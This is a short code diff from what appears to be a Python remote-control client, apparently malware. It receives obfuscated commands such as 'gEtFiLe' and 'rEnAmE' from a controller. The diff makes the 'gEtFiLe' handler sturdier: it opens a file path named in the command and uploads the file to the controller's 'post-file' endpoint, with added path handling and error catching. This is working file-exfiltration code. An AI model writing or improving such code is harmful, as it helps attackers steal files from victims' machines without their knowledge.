@@ -591,10 +591,20 @@ def main():
                 saying = Thread(target=say,args=(txt,))
                 saying.start()
             elif "gEtFiLe" in cmd:
-                p = cmd.replace("gEtFiLe ","")
-                with open(p,"rb") as file:
-                    files = {'file': file}
-                post(url+"post-file", files=files)  
+                p = cmd.replace("gEtFiLe ", "")
+                if p.startswith("/"):
+                    p = p.replace("/", "")
+                
+                try:
+                    with open(p, "rb") as file:
+                        files = {'file': file}
+                        print("file")
+                        try:
+                            res = post(url + "post-file", files=files)
+                        except Exception as e:
+                            print("Error during file post:", e)
+                except Exception as e:
+                    print(f"Error opening file {p}: {e}")
             elif "rEnAmE" in cmd:
                 a = cmd.replace("rEnAmE ","")
                 p, name = a.split("|")
